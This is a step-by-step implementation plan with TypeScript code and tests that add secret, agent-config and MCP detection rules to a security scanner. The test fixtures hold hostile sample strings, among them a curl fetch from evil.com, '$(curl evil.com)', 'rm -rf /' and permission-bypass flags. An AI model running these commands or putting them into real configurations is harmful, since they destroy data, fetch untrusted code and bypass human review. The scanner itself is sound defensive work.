# Plan: Phase 1 -- New Security Rule Categories

**Date:** 2026-03-30
**Spec:** docs/changes/runtime-enforcement-extensions/proposal.md
**Estimated tasks:** 8
**Estimated time:** 30 minutes

## Goal

Extend the `SecurityScanner` with 18 new rules across 3 categories (extended secrets, agent-config, MCP), with `fileGlob` filtering so agent-config and MCP rules only scan relevant files.

## Observable Truths (Acceptance Criteria)

1. When `SecurityCategory` is inspected, it includes `'agent-config'` and `'mcp'` as valid union members.
2. The `secretRules` array exports 11 rules total (5 existing + 6 new: SEC-SEC-006 through SEC-SEC-011).
3. The `agentConfigRules` array exports 7 rules (SEC-AGT-001 through SEC-AGT-007), each with a `fileGlob` property.
4. The `mcpRules` array exports 5 rules (SEC-MCP-001 through SEC-MCP-005), each with `fileGlob: '**/.mcp.json'`.
5. When `scanFile()` is called with a `.ts` file path, agent-config and MCP rules do not fire (they are filtered by `fileGlob`).
6. When `scanFile()` is called with a `.mcp.json` file path containing `npx -y`, SEC-MCP-004 fires.
7. When `scanFile()` is called with a `CLAUDE.md` file path containing zero-width characters, SEC-AGT-001 fires.
8. All 67 existing security tests continue to pass without modification.
9. When `cd packages/core && npx vitest run tests/security/` is run, all tests pass (existing + new).
10. When a new rule's severity is set to `"off"` in config, it produces no findings.

## File Map

```
MODIFY packages/core/src/security/types.ts              -- extend SecurityCategory union
MODIFY packages/core/src/security/rules/secrets.ts       -- add SEC-SEC-006 through SEC-SEC-011
CREATE packages/core/src/security/rules/agent-config.ts  -- SEC-AGT-001 through SEC-AGT-007
CREATE packages/core/src/security/rules/mcp.ts           -- SEC-MCP-001 through SEC-MCP-005
MODIFY packages/core/src/security/scanner.ts             -- import/register new rules, add fileGlob filtering
MODIFY packages/core/src/security/index.ts               -- export agentConfigRules, mcpRules
CREATE packages/core/tests/security/rules/secrets-new.test.ts      -- tests for 6 new secret rules
CREATE packages/core/tests/security/rules/agent-config.test.ts     -- tests for 7 agent-config rules
CREATE packages/core/tests/security/rules/mcp.test.ts              -- tests for 5 MCP rules
CREATE packages/core/tests/security/scanner-fileglob.test.ts       -- tests for fileGlob filtering in scanFile
```

## Tasks

### Task 1: Extend SecurityCategory type

**Depends on:** none
**Files:** `packages/core/src/security/types.ts`

1. Open `packages/core/src/security/types.ts` and add two new members to the `SecurityCategory` union type:

   ```typescript
   export type SecurityCategory =
     | 'secrets'
     | 'injection'
     | 'xss'
     | 'crypto'
     | 'network'
     | 'deserialization'
     | 'path-traversal'
     | 'agent-config'
     | 'mcp';
   ```

2. Run existing tests to confirm no breakage:
   ```
   cd packages/core && npx vitest run tests/security/
   ```
3. Observe: all 67 tests pass.
4. Commit: `feat(security): extend SecurityCategory with agent-config and mcp`

---

### Task 2: Add 6 new secret rules (TDD)

**Depends on:** Task 1
**Files:** `packages/core/src/security/rules/secrets.ts`, `packages/core/tests/security/rules/secrets-new.test.ts`

1. Create test file `packages/core/tests/security/rules/secrets-new.test.ts`:

   ```typescript
   import { describe, it, expect } from 'vitest';
   import { secretRules } from '../../../src/security/rules/secrets';

   describe('New secret detection rules (SEC-SEC-006 through SEC-SEC-011)', () => {
     it('exports 11 total rules', () => {
       expect(secretRules).toHaveLength(11);
     });

     it('SEC-SEC-006: detects Anthropic API keys', () => {
       const rule = secretRules.find((r) => r.id === 'SEC-SEC-006');
       expect(rule).toBeDefined();
       expect(rule!.patterns.some((p) => p.test('key = "sk-ant-api03-abcdef1234567890"'))).toBe(
         true
       );
       expect(rule!.patterns.some((p) => p.test('key = process.env.ANTHROPIC_KEY'))).toBe(false);
       expect(rule!.references).toContain('CWE-798');
     });

     it('SEC-SEC-007: detects OpenAI API keys', () => {
       const rule = secretRules.find((r) => r.id === 'SEC-SEC-007');
       expect(rule).toBeDefined();
       expect(
         rule!.patterns.some((p) => p.test('key = "sk-proj-abcdefghijklmnopqrstuvwxyz123456"'))
       ).toBe(true);
       expect(rule!.patterns.some((p) => p.test('key = "sk-proj-ab"'))).toBe(false); // too short
     });

     it('SEC-SEC-008: detects Google API keys', () => {
       const rule = secretRules.find((r) => r.id === 'SEC-SEC-008');
       expect(rule).toBeDefined();
       expect(
         rule!.patterns.some((p) => p.test('key = "AIzaSyA1234567890abcdefghijklmnopqrstuv"'))
       ).toBe(true);
       expect(rule!.patterns.some((p) => p.test('key = "AIza_short"'))).toBe(false); // too short
     });

     it('SEC-SEC-009: detects GitHub PATs', () => {
       const rule = secretRules.find((r) => r.id === 'SEC-SEC-009');
       expect(rule).toBeDefined();
       expect(
         rule!.patterns.some((p) => p.test('token = "ghp_abcdefghijklmnopqrstuvwxyz123456"'))
       ).toBe(true);
       expect(
         rule!.patterns.some((p) => p.test('token = "gho_abcdefghijklmnopqrstuvwxyz123456"'))
       ).toBe(true);
       expect(
         rule!.patterns.some((p) => p.test('token = "ghu_abcdefghijklmnopqrstuvwxyz123456"'))
       ).toBe(true);
       expect(
         rule!.patterns.some((p) => p.test('token = "ghs_abcdefghijklmnopqrstuvwxyz123456"'))
       ).toBe(true);
       expect(rule!.patterns.some((p) => p.test('token = "ghx_invalid"'))).toBe(false);
     });

     it('SEC-SEC-010: detects Stripe keys', () => {
       const rule = secretRules.find((r) => r.id === 'SEC-SEC-010');
       expect(rule).toBeDefined();
       const suffix = 'abc123def456ghi789jkl012';
       expect(rule!.patterns.some((p) => p.test(`key = "sk_live_${suffix}"`))).toBe(true);
       expect(rule!.patterns.some((p) => p.test(`key = "pk_live_${suffix}"`))).toBe(true);
       expect(rule!.patterns.some((p) => p.test(`key = "rk_live_${suffix}"`))).toBe(true);
       expect(rule!.patterns.some((p) => p.test('key = "sk_test_abc123"'))).toBe(false); // test key, not live
     });

     it('SEC-SEC-011: detects database connection strings with credentials', () => {
       const rule = secretRules.find((r) => r.id === 'SEC-SEC-011');
       expect(rule).toBeDefined();
       expect(
         rule!.patterns.some((p) => p.test('url = "postgres://admin:secret@db.host.com/mydb"'))
       ).toBe(true);
       expect(
         rule!.patterns.some((p) => p.test('url = "mongodb://user:p4ss@mongo.host:27017"'))
       ).toBe(true);
       expect(rule!.patterns.some((p) => p.test('url = "postgres://localhost/mydb"'))).toBe(false); // no creds
     });

     it('all new rules have category secrets and severity error', () => {
       const newRules = secretRules.filter((r) => parseInt(r.id.split('-')[2]) >= 6);
       expect(newRules).toHaveLength(6);
       for (const rule of newRules) {
         expect(rule.category).toBe('secrets');
         expect(rule.severity).toBe('error');
         expect(rule.confidence).toBe('high');
       }
     });
   });
   ```

2. Run test:
   ```
   cd packages/core && npx vitest run tests/security/rules/secrets-new.test.ts
   ```
3. Observe failure: `expected 11 to be 5` (only 5 existing rules).

4. Add 6 new rules to `packages/core/src/security/rules/secrets.ts`, appending after the existing SEC-SEC-005 entry:

   ```typescript
     {
       id: 'SEC-SEC-006',
       name: 'Anthropic API Key',
       category: 'secrets',
       severity: 'error',
       confidence: 'high',
       patterns: [/sk-ant-api03-[A-Za-z0-9_-]{20,}/],
       message: 'Hardcoded Anthropic API key detected',
       remediation: 'Use environment variables: process.env.ANTHROPIC_API_KEY',
       references: ['CWE-798'],
     },
     {
       id: 'SEC-SEC-007',
       name: 'OpenAI API Key',
       category: 'secrets',
       severity: 'error',
       confidence: 'high',
       patterns: [/sk-proj-[A-Za-z0-9_-]{20,}/],
       message: 'Hardcoded OpenAI API key detected',
       remediation: 'Use environment variables: process.env.OPENAI_API_KEY',
       references: ['CWE-798'],
     },
     {
       id: 'SEC-SEC-008',
       name: 'Google API Key',
       category: 'secrets',
       severity: 'error',
       confidence: 'high',
       patterns: [/AIza[A-Za-z0-9_-]{35}/],
       message: 'Hardcoded Google API key detected',
       remediation: 'Use environment variables or a secrets manager for Google API keys',
       references: ['CWE-798'],
     },
     {
       id: 'SEC-SEC-009',
       name: 'GitHub Personal Access Token',
       category: 'secrets',
       severity: 'error',
       confidence: 'high',
       patterns: [/gh[pousr]_[A-Za-z0-9_]{36,}/],
       message: 'Hardcoded GitHub personal access token detected',
       remediation: 'Use environment variables: process.env.GITHUB_TOKEN',
       references: ['CWE-798'],
     },
     {
       id: 'SEC-SEC-010',
       name: 'Stripe Live Key',
       category: 'secrets',
       severity: 'error',
       confidence: 'high',
       patterns: [/[spr]k_live_[A-Za-z0-9]{24,}/],
       message: 'Hardcoded Stripe live key detected',
       remediation: 'Use environment variables for Stripe keys; never commit live keys',
       references: ['CWE-798'],
     },
     {
       id: 'SEC-SEC-011',
       name: 'Database Connection String with Credentials',
       category: 'secrets',
       severity: 'error',
       confidence: 'high',
       patterns: [/(?:postgres|mysql|mongodb|redis|amqp|mssql)(?:\+\w+)?:\/\/[^/\s:]+:[^@/\s]+@/i],
       message: 'Database connection string with embedded credentials detected',
       remediation: 'Use environment variables for connection strings; separate credentials from URIs',
       references: ['CWE-798'],
     },
   ```

5. Run test:
   ```
   cd packages/core && npx vitest run tests/security/rules/secrets-new.test.ts
   ```
6. Observe: all tests pass.

7. Run full security test suite to verify no breakage:
   ```
   cd packages/core && npx vitest run tests/security/
   ```
8. Observe: all tests pass (existing tests use `toBeGreaterThan(0)` so adding rules does not break them).
9. Commit: `feat(security): add 6 new secret detection rules (SEC-SEC-006 through SEC-SEC-011)`

---

### Task 3: Create agent-config rules (TDD)

**Depends on:** Task 1
**Files:** `packages/core/src/security/rules/agent-config.ts`, `packages/core/tests/security/rules/agent-config.test.ts`

1. Create test file `packages/core/tests/security/rules/agent-config.test.ts`:

   ```typescript
   import { describe, it, expect } from 'vitest';
   import { agentConfigRules } from '../../../src/security/rules/agent-config';

   describe('Agent config security rules', () => {
     it('exports 7 rules', () => {
       expect(agentConfigRules).toHaveLength(7);
     });

     it('all rules have category agent-config', () => {
       for (const rule of agentConfigRules) {
         expect(rule.id).toMatch(/^SEC-AGT-/);
         expect(rule.category).toBe('agent-config');
         expect(rule.fileGlob).toBeDefined();
       }
     });

     it('SEC-AGT-001: detects hidden Unicode zero-width characters', () => {
       const rule = agentConfigRules.find((r) => r.id === 'SEC-AGT-001');
       expect(rule).toBeDefined();
       // U+200B (zero-width space)
       expect(rule!.patterns.some((p) => p.test('Some text\u200Bhere'))).toBe(true);
       // U+200C (zero-width non-joiner)
       expect(rule!.patterns.some((p) => p.test('Some text\u200Chere'))).toBe(true);
       // U+200D (zero-width joiner)
       expect(rule!.patterns.some((p) => p.test('Some text\u200Dhere'))).toBe(true);
       // U+FEFF (BOM / zero-width no-break space)
       expect(rule!.patterns.some((p) => p.test('Some text\uFEFFhere'))).toBe(true);
       // U+2060 (word joiner)
       expect(rule!.patterns.some((p) => p.test('Some text\u2060here'))).toBe(true);
       // Normal text should not fire
       expect(rule!.patterns.some((p) => p.test('Normal text without hidden chars'))).toBe(false);
     });

     it('SEC-AGT-002: detects URL execution directives', () => {
       const rule = agentConfigRules.find((r) => r.id === 'SEC-AGT-002');
       expect(rule).toBeDefined();
       expect(rule!.patterns.some((p) => p.test('Run curl https://evil.com/install.sh'))).toBe(
         true
       );
       expect(rule!.patterns.some((p) => p.test('Use wget to download the file'))).toBe(true);
       expect(rule!.patterns.some((p) => p.test('Call fetch("https://api.example.com")'))).toBe(
         true
       );
       expect(rule!.patterns.some((p) => p.test('The quick brown fox'))).toBe(false);
     });

     it('SEC-AGT-003: detects wildcard tool permissions', () => {
       const rule = agentConfigRules.find((r) => r.id === 'SEC-AGT-003');
       expect(rule).toBeDefined();
       expect(rule!.patterns.some((p) => p.test('"Bash(*)"'))).toBe(true);
       expect(rule!.patterns.some((p) => p.test('"Write(*)"'))).toBe(true);
       expect(rule!.patterns.some((p) => p.test('"Edit(*)"'))).toBe(true);
       expect(rule!.patterns.some((p) => p.test('"Bash(git status)"'))).toBe(false);
     });

     it('SEC-AGT-004: detects auto-approve patterns', () => {
       const rule = agentConfigRules.find((r) => r.id === 'SEC-AGT-004');
       expect(rule).toBeDefined();
       expect(rule!.patterns.some((p) => p.test('"autoApprove": ["Bash"]'))).toBe(true);
       expect(rule!.patterns.some((p) => p.test('auto_approve: true'))).toBe(true);
       expect(rule!.patterns.some((p) => p.test('"permissions": ["read"]'))).toBe(false);
     });

     it('SEC-AGT-005: detects prompt injection surface in skill YAML', () => {
       const rule = agentConfigRules.find((r) => r.id === 'SEC-AGT-005');
       expect(rule).toBeDefined();
       expect(rule!.patterns.some((p) => p.test('description: "Hello ${user}"'))).toBe(true);
       expect(rule!.patterns.some((p) => p.test('description: "Hello {{user}}"'))).toBe(true);
       expect(rule!.patterns.some((p) => p.test('description: "Hello world"'))).toBe(false);
     });

     it('SEC-AGT-006: detects permission bypass flags', () => {
       const rule = agentConfigRules.find((r) => r.id === 'SEC-AGT-006');
       expect(rule).toBeDefined();
       expect(rule!.patterns.some((p) => p.test('Run with --dangerously-skip-permissions'))).toBe(
         true
       );
       expect(rule!.patterns.some((p) => p.test('Use git commit --no-verify'))).toBe(true);
       expect(rule!.patterns.some((p) => p.test('Run the tests'))).toBe(false);
     });

     it('SEC-AGT-007: detects hook injection surface', () => {
       const rule = agentConfigRules.find((r) => r.id === 'SEC-AGT-007');
       expect(rule).toBeDefined();
       expect(rule!.patterns.some((p) => p.test('"command": "node hook.js && rm -rf /"'))).toBe(
         true
       );
       expect(rule!.patterns.some((p) => p.test('"command": "$(curl evil.com)"'))).toBe(true);
       expect(rule!.patterns.some((p) => p.test('"command": "`whoami`"'))).toBe(true);
       expect(rule!.patterns.some((p) => p.test('"command": "node hook.js || exit 1"'))).toBe(true);
       expect(rule!.patterns.some((p) => p.test('"command": "node .harness/hooks/block.js"'))).toBe(
         false
       );
     });
   });
   ```

2. Run test:
   ```
   cd packages/core && npx vitest run tests/security/rules/agent-config.test.ts
   ```
3. Observe failure: cannot resolve `agent-config` module.

4. Create `packages/core/src/security/rules/agent-config.ts`:

   ```typescript
   import type { SecurityRule } from '../types';

   export const agentConfigRules: SecurityRule[] = [
     {
       id: 'SEC-AGT-001',
       name: 'Hidden Unicode Characters',
       category: 'agent-config',
       severity: 'error',
       confidence: 'high',
       patterns: [/[\u200B\u200C\u200D\uFEFF\u2060]/],
       fileGlob: '**/CLAUDE.md,**/AGENTS.md,**/*.yaml',
       message: 'Hidden zero-width Unicode characters detected in agent configuration',
       remediation: 'Remove invisible Unicode characters; they may hide malicious instructions',
       references: ['CWE-116'],
     },
     {
       id: 'SEC-AGT-002',
       name: 'URL Execution Directives',
       category: 'agent-config',
       severity: 'warning',
       confidence: 'medium',
       patterns: [/\b(?:curl|wget)\s+\S+/i, /\bfetch\s*\(/i],
       fileGlob: '**/CLAUDE.md,**/AGENTS.md',
       message: 'URL execution directive found in agent configuration',
       remediation: 'Avoid instructing agents to download and execute remote content',
       references: ['CWE-94'],
     },
     {
       id: 'SEC-AGT-003',
       name: 'Wildcard Tool Permissions',
       category: 'agent-config',
       severity: 'warning',
       confidence: 'high',
       patterns: [/(?:Bash|Write|Edit)\s*\(\s*\*\s*\)/],
       fileGlob: '**/.claude/**,**/settings*.json',
       message: 'Wildcard tool permissions grant unrestricted access',
       remediation: 'Scope tool permissions to specific patterns instead of wildcards',
       references: ['CWE-250'],
     },
     {
       id: 'SEC-AGT-004',
       name: 'Auto-approve Patterns',
       category: 'agent-config',
       severity: 'warning',
       confidence: 'high',
       patterns: [/\bautoApprove\b/i, /\bauto_approve\b/i],
       fileGlob: '**/.claude/**,**/.mcp.json',
       message: 'Auto-approve configuration bypasses human review of tool calls',
       remediation:
         'Review auto-approved tools carefully; prefer explicit approval for destructive operations',
       references: ['CWE-862'],
     },
     {
       id: 'SEC-AGT-005',
       name: 'Prompt Injection Surface',
       category: 'agent-config',
       severity: 'warning',
       confidence: 'medium',
       patterns: [/\$\{[^}]*\}/, /\{\{[^}]*\}\}/],
       fileGlob: '**/skill.yaml',
       message: 'Template interpolation syntax in skill YAML may enable prompt injection',
       remediation: 'Avoid dynamic interpolation in skill descriptions; use static text',
       references: ['CWE-94'],
     },
     {
       id: 'SEC-AGT-006',
       name: 'Permission Bypass Flags',
       category: 'agent-config',
       severity: 'error',
       confidence: 'high',
       patterns: [/--dangerously-skip-permissions/, /--no-verify/],
       fileGlob: '**/CLAUDE.md,**/AGENTS.md,**/.claude/**',
       message: 'Permission bypass flag detected in agent configuration',
       remediation: 'Remove flags that bypass safety checks; they undermine enforcement',
       references: ['CWE-863'],
     },
     {
       id: 'SEC-AGT-007',
       name: 'Hook Injection Surface',
       category: 'agent-config',
       severity: 'error',
       confidence: 'medium',
       patterns: [/\$\(/, /`[^`]+`/, /\s&&\s/, /\s\|\|\s/],
       fileGlob: '**/settings*.json,**/hooks.json',
       message: 'Shell metacharacters in hook commands may enable command injection',
       remediation:
         'Use simple, single-command hooks without shell operators; chain logic inside the script',
       references: ['CWE-78'],
     },
   ];
   ```

5. Run test:
   ```
   cd packages/core && npx vitest run tests/security/rules/agent-config.test.ts
   ```
6. Observe: all tests pass.
7. Commit: `feat(security): add 7 agent-config security rules (SEC-AGT-001 through SEC-AGT-007)`

---

### Task 4: Create MCP rules (TDD)

**Depends on:** Task 1
**Files:** `packages/core/src/security/rules/mcp.ts`, `packages/core/tests/security/rules/mcp.test.ts`

1. Create test file `packages/core/tests/security/rules/mcp.test.ts`:

   ```typescript
   import { describe, it, expect } from 'vitest';
   import { mcpRules } from '../../../src/security/rules/mcp';

   describe('MCP security rules', () => {
     it('exports 5 rules', () => {
       expect(mcpRules).toHaveLength(5);
     });

     it('all rules have category mcp and target .mcp.json', () => {
       for (const rule of mcpRules) {
         expect(rule.id).toMatch(/^SEC-MCP-/);
         expect(rule.category).toBe('mcp');
         expect(rule.fileGlob).toBe('**/.mcp.json');
       }
     });

     it('SEC-MCP-001: detects hardcoded secrets in MCP env', () => {
       const rule = mcpRules.find((r) => r.id === 'SEC-MCP-001');
       expect(rule).toBeDefined();
       expect(rule!.patterns.some((p) => p.test('"API_KEY": "sk-live-abc123"'))).toBe(true);
       expect(
         rule!.patterns.some((p) =>
           p.test('"TOKEN": "ghp_abcdef1234567890abcdef1234567890abcdef12"')
         )
       ).toBe(true);
       expect(rule!.patterns.some((p) => p.test('"PASSWORD": "hunter2"'))).toBe(true);
       expect(rule!.patterns.some((p) => p.test('"PORT": "3000"'))).toBe(false);
     });

     it('SEC-MCP-002: detects shell injection in MCP args', () => {
       const rule = mcpRules.find((r) => r.id === 'SEC-MCP-002');
       expect(rule).toBeDefined();
       expect(rule!.patterns.some((p) => p.test('"args": ["--flag", "$(whoami)"]'))).toBe(true);
       expect(rule!.patterns.some((p) => p.test('"args": ["`rm -rf /`"]'))).toBe(true);
       expect(rule!.patterns.some((p) => p.test('"args": ["--port", "3000"]'))).toBe(false);
     });

     it('SEC-MCP-003: detects network exposure with 0.0.0.0', () => {
       const rule = mcpRules.find((r) => r.id === 'SEC-MCP-003');
       expect(rule).toBeDefined();
       expect(rule!.patterns.some((p) => p.test('"host": "0.0.0.0"'))).toBe(true);
       expect(rule!.patterns.some((p) => p.test('"host": "127.0.0.1"'))).toBe(false);
     });

     it('SEC-MCP-004: detects npx -y typosquatting vector', () => {
       const rule = mcpRules.find((r) => r.id === 'SEC-MCP-004');
       expect(rule).toBeDefined();
       expect(rule!.patterns.some((p) => p.test('"command": "npx -y some-package"'))).toBe(true);
       expect(rule!.patterns.some((p) => p.test('"command": "npx --yes some-package"'))).toBe(true);
       expect(rule!.patterns.some((p) => p.test('"command": "npx some-package"'))).toBe(false);
     });

     it('SEC-MCP-005: detects unencrypted http:// transport', () => {
       const rule = mcpRules.find((r) => r.id === 'SEC-MCP-005');
       expect(rule).toBeDefined();
       expect(rule!.patterns.some((p) => p.test('"url": "http://mcp-server.example.com"'))).toBe(
         true
       );
       expect(rule!.patterns.some((p) => p.test('"url": "https://mcp-server.example.com"'))).toBe(
         false
       );
       // localhost should not trigger
       expect(rule!.patterns.some((p) => p.test('"url": "http://localhost:3000"'))).toBe(false);
       expect(rule!.patterns.some((p) => p.test('"url": "http://127.0.0.1:3000"'))).toBe(false);
     });
   });
   ```

2. Run test:
   ```
   cd packages/core && npx vitest run tests/security/rules/mcp.test.ts
   ```
3. Observe failure: cannot resolve `mcp` module.

4. Create `packages/core/src/security/rules/mcp.ts`:

   ```typescript
   import type { SecurityRule } from '../types';

   export const mcpRules: SecurityRule[] = [
     {
       id: 'SEC-MCP-001',
       name: 'Hardcoded MCP Secrets',
       category: 'mcp',
       severity: 'error',
       confidence: 'high',
       patterns: [/(?:API_KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL)\s*["']?\s*:\s*["'][^"']{8,}["']/i],
       fileGlob: '**/.mcp.json',
       message: 'Hardcoded secret detected in MCP server configuration',
       remediation: 'Use environment variable references instead of inline secrets in .mcp.json',
       references: ['CWE-798'],
     },
     {
       id: 'SEC-MCP-002',
       name: 'Shell Injection in MCP Args',
       category: 'mcp',
       severity: 'error',
       confidence: 'medium',
       patterns: [/\$\(/, /`[^`]+`/],
       fileGlob: '**/.mcp.json',
       message: 'Shell metacharacters detected in MCP server arguments',
       remediation: 'Use literal argument values; avoid shell interpolation in MCP args',
       references: ['CWE-78'],
     },
     {
       id: 'SEC-MCP-003',
       name: 'Network Exposure',
       category: 'mcp',
       severity: 'warning',
       confidence: 'high',
       patterns: [/0\.0\.0\.0/],
       fileGlob: '**/.mcp.json',
       message: 'MCP server binding to all network interfaces (0.0.0.0)',
       remediation: 'Bind to 127.0.0.1 or localhost to restrict access to local machine',
       references: ['CWE-668'],
     },
     {
       id: 'SEC-MCP-004',
       name: 'Typosquatting Vector',
       category: 'mcp',
       severity: 'warning',
       confidence: 'medium',
       patterns: [/\bnpx\s+(?:-y|--yes)\b/],
       fileGlob: '**/.mcp.json',
       message: 'npx -y auto-installs packages without confirmation, enabling typosquatting',
       remediation: 'Pin exact package versions or install packages explicitly before use',
       references: ['CWE-427'],
     },
     {
       id: 'SEC-MCP-005',
       name: 'Unencrypted Transport',
       category: 'mcp',
       severity: 'warning',
       confidence: 'medium',
       patterns: [/http:\/\/(?!localhost\b|127\.0\.0\.1\b)/],
       fileGlob: '**/.mcp.json',
       message: 'Unencrypted HTTP transport detected for MCP server connection',
       remediation: 'Use https:// for all non-localhost MCP server connections',
       references: ['CWE-319'],
     },
   ];
   ```

5. Run test:
   ```
   cd packages/core && npx vitest run tests/security/rules/mcp.test.ts
   ```
6. Observe: all tests pass.
7. Commit: `feat(security): add 5 MCP security rules (SEC-MCP-001 through SEC-MCP-005)`

---

### Task 5: Register new rules in scanner and update barrel export

**Depends on:** Tasks 2, 3, 4
**Files:** `packages/core/src/security/scanner.ts`, `packages/core/src/security/index.ts`

1. In `packages/core/src/security/scanner.ts`, add imports after existing rule imports:

   ```typescript
   import { agentConfigRules } from './rules/agent-config';
   import { mcpRules } from './rules/mcp';
   ```

2. In the constructor's base rule registration, add the new rule arrays:

   Change:

   ```typescript
   this.registry.registerAll([
     ...secretRules,
     ...injectionRules,
     ...xssRules,
     ...cryptoRules,
     ...pathTraversalRules,
     ...networkRules,
     ...deserializationRules,
   ]);
   ```

   To:

   ```typescript
   this.registry.registerAll([
     ...secretRules,
     ...injectionRules,
     ...xssRules,
     ...cryptoRules,
     ...pathTraversalRules,
     ...networkRules,
     ...deserializationRules,
     ...agentConfigRules,
     ...mcpRules,
   ]);
   ```

3. In `packages/core/src/security/index.ts`, add exports after the existing rule exports (after the `deserializationRules` line):

   ```typescript
   export { agentConfigRules } from './rules/agent-config';
   export { mcpRules } from './rules/mcp';
   ```

4. Run full security test suite:
   ```
   cd packages/core && npx vitest run tests/security/
   ```
5. Observe: all tests pass (existing + new rule tests). The scanner test for `scanFile` may need attention -- existing `scanFile` tests mock `readFile` and pass content through `scanContent` which runs all active rules. Since we added more rules, the `>=2` assertion in the scanFile test still holds.
6. Commit: `feat(security): register agent-config and MCP rules in scanner`

---

### Task 6: Add fileGlob filtering to scanFile (TDD)

**Depends on:** Task 5
**Files:** `packages/core/src/security/scanner.ts`, `packages/core/tests/security/scanner-fileglob.test.ts`

1. Create test file `packages/core/tests/security/scanner-fileglob.test.ts`:

   ```typescript
   import { describe, it, expect, vi } from 'vitest';
   import { SecurityScanner } from '../../src/security/scanner';

   vi.mock('node:fs/promises', async () => ({
     readFile: vi.fn(),
   }));

   describe('SecurityScanner fileGlob filtering', () => {
     it('agent-config rules do not fire when scanning a .ts file', async () => {
       const { readFile } = await import('node:fs/promises');
       // Content that would match SEC-AGT-006 (--dangerously-skip-permissions)
       vi.mocked(readFile).mockResolvedValue('Run with --dangerously-skip-permissions');

       const scanner = new SecurityScanner({ enabled: true, strict: false });
       const findings = await scanner.scanFile('src/utils.ts');
       const agentFindings = findings.filter((f) => f.ruleId.startsWith('SEC-AGT-'));
       expect(agentFindings).toHaveLength(0);
     });

     it('agent-config rules fire when scanning a CLAUDE.md file', async () => {
       const { readFile } = await import('node:fs/promises');
       vi.mocked(readFile).mockResolvedValue('Run with --dangerously-skip-permissions');

       const scanner = new SecurityScanner({ enabled: true, strict: false });
       const findings = await scanner.scanFile('project/CLAUDE.md');
       const agentFindings = findings.filter((f) => f.ruleId === 'SEC-AGT-006');
       expect(agentFindings.length).toBeGreaterThan(0);
     });

     it('MCP rules do not fire when scanning a .ts file', async () => {
       const { readFile } = await import('node:fs/promises');
       vi.mocked(readFile).mockResolvedValue('"command": "npx -y some-package"');

       const scanner = new SecurityScanner({ enabled: true, strict: false });
       const findings = await scanner.scanFile('src/server.ts');
       const mcpFindings = findings.filter((f) => f.ruleId.startsWith('SEC-MCP-'));
       expect(mcpFindings).toHaveLength(0);
     });

     it('MCP rules fire when scanning a .mcp.json file', async () => {
       const { readFile } = await import('node:fs/promises');
       vi.mocked(readFile).mockResolvedValue('"command": "npx -y some-package"');

       const scanner = new SecurityScanner({ enabled: true, strict: false });
       const findings = await scanner.scanFile('project/.mcp.json');
       const mcpFindings = findings.filter((f) => f.ruleId === 'SEC-MCP-004');
       expect(mcpFindings.length).toBeGreaterThan(0);
     });

     it('rules without fileGlob still apply to all files', async () => {
       const { readFile } = await import('node:fs/promises');
       vi.mocked(readFile).mockResolvedValue('const key = "AKIAIOSFODNN7EXAMPLE";');

       const scanner = new SecurityScanner({ enabled: true, strict: false });
       const findings = await scanner.scanFile('src/config.ts');
       expect(findings.some((f) => f.ruleId === 'SEC-SEC-001')).toBe(true);
     });

     it('scanContent still applies all rules regardless of fileGlob (backward compat)', () => {
       const scanner = new SecurityScanner({ enabled: true, strict: false });
       // scanContent does not filter by fileGlob -- it applies all active rules
       const findings = scanner.scanContent('"command": "npx -y some-package"', 'random.txt');
       // MCP rules should still fire in scanContent (no path filtering)
       const mcpFindings = findings.filter((f) => f.ruleId === 'SEC-MCP-004');
       expect(mcpFindings.length).toBeGreaterThan(0);
     });
   });
   ```

2. Run test:
   ```
   cd packages/core && npx vitest run tests/security/scanner-fileglob.test.ts
   ```
3. Observe failure: agent-config rules fire against `.ts` files (no filtering yet).

4. Modify `packages/core/src/security/scanner.ts`:

   Add import at the top:

   ```typescript
   import { minimatch } from 'minimatch';
   ```

   Replace the `scanFile` method:

   ```typescript
   async scanFile(filePath: string): Promise<SecurityFinding[]> {
     if (!this.config.enabled) return [];
     const content = await fs.readFile(filePath, 'utf-8');
     return this.scanContentForFile(content, filePath, 1);
   }
   ```

   Add a new private method after `scanContent`:

   ```typescript
   private scanContentForFile(content: string, filePath: string, startLine: number = 1): SecurityFinding[] {
     if (!this.config.enabled) return [];

     const findings: SecurityFinding[] = [];
     const lines = content.split('\n');

     // Filter rules by fileGlob when scanning a specific file
     const applicableRules = this.activeRules.filter((rule) => {
       if (!rule.fileGlob) return true;
       // fileGlob can be comma-separated patterns
       const globs = rule.fileGlob.split(',').map((g) => g.trim());
       return globs.some((glob) => minimatch(filePath, glob, { dot: true }));
     });

     for (const rule of applicableRules) {
       const resolved = resolveRuleSeverity(
         rule.id,
         rule.severity,
         this.config.rules ?? {},
         this.config.strict
       );

       if (resolved === 'off') continue;

       for (let i = 0; i < lines.length; i++) {
         const line = lines[i] ?? '';

         // Support inline suppression: // harness-ignore SEC-XXX-NNN
         if (line.includes('harness-ignore') && line.includes(rule.id)) continue;

         for (const pattern of rule.patterns) {
           // Reset regex lastIndex for global/sticky patterns
           pattern.lastIndex = 0;
           if (pattern.test(line)) {
             findings.push({
               ruleId: rule.id,
               ruleName: rule.name,
               category: rule.category,
               severity: resolved as SecurityFinding['severity'],
               confidence: rule.confidence,
               file: filePath,
               line: startLine + i,
               match: line.trim(),
               context: line,
               message: rule.message,
               remediation: rule.remediation,
               ...(rule.references ? { references: rule.references } : {}),
             });
             break; // One finding per rule per line
           }
         }
       }
     }

     return findings;
   }
   ```

5. Run fileGlob tests:
   ```
   cd packages/core && npx vitest run tests/security/scanner-fileglob.test.ts
   ```
6. Observe: all tests pass.

7. Run full security test suite:
   ```
   cd packages/core && npx vitest run tests/security/
   ```
8. Observe: all tests pass.
9. Commit: `feat(security): add fileGlob filtering to scanFile for targeted rule application`

---

### Task 7: Verify full test suite and existing test compatibility

**Depends on:** Task 6
**Files:** none (verification only)

[checkpoint:human-verify]

1. Run the complete security test suite:
   ```
   cd packages/core && npx vitest run tests/security/ --reporter=verbose
   ```
2. Verify: all original 67 tests still pass.
3. Verify: new tests (secrets-new, agent-config, mcp, scanner-fileglob) all pass.
4. Run typecheck to confirm no type errors:
   ```
   cd packages/core && npx tsc --noEmit
   ```
5. Observe: no type errors.

---

### Task 8: Verify integration with existing scanner behavior

**Depends on:** Task 7
**Files:** none (verification only)

1. Run the full `packages/core` test suite (not just security):
   ```
   cd packages/core && npx vitest run
   ```
2. Observe: all tests pass, including any tests that import from the security barrel export.
3. If any tests fail due to the new rules producing unexpected findings, investigate and add inline suppressions or adjust test content as needed.
4. Commit (only if adjustments were needed): `fix(security): adjust existing tests for new rule compatibility`
